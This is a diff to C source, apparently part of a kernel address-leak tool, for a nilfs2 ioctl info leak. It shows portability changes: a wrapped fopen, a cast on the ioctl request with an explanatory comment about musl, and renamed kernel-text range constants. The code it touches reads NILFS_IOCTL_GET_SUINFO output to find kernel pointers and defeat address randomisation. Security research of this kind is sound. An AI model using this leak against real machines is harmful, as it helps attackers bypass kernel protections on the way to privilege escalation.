@@ -97,7 +97,7 @@ static int open_nilfs2_fd(void) {
   char mountpoint[256];
   int fd;
 
-  fp = fopen("/proc/mounts", "r");
+  fp = kasld_fopen("/proc/mounts", "r");
   if (!fp) {
     perror("[-] fopen /proc/mounts");
     return -1;
@@ -137,7 +137,13 @@ static unsigned long try_leak(int nilfs_fd) {
   argv.v_size = REQUEST_VSIZE;
   argv.v_index = 0;
 
-  if (ioctl(nilfs_fd, NILFS_IOCTL_GET_SUINFO, &argv) < 0) {
+  /* musl's POSIX-strict `ioctl(int fd, int request, ...)` triggers -Woverflow
+   * when the unsigned `_IOR(...)` expansion (high bit set) is narrowed to a
+   * signed int. The bit pattern is the contract — the kernel reads it as
+   * 32-bit unsigned regardless — so the cast is safe; explicit cast silences
+   * the warning under musl and is a no-op under glibc (which prototypes the
+   * request as `unsigned long int`). */
+  if (ioctl(nilfs_fd, (int)NILFS_IOCTL_GET_SUINFO, &argv) < 0) {
     if (errno == ENOTTY || errno == EINVAL)
       fprintf(stderr, "[-] NILFS_IOCTL_GET_SUINFO not supported\n");
     else
@@ -158,7 +164,7 @@ static unsigned long try_leak(int nilfs_fd) {
          off += sizeof(unsigned long)) {
       unsigned long val;
       memcpy(&val, entry + off, sizeof(val));
-      if (val >= KERNEL_BASE_MIN && val <= KERNEL_BASE_MAX) {
+      if (val >= KERNEL_TEXT_MIN && val <= KERNEL_TEXT_MAX) {
         addr = val;
         free(buf);
         return addr;
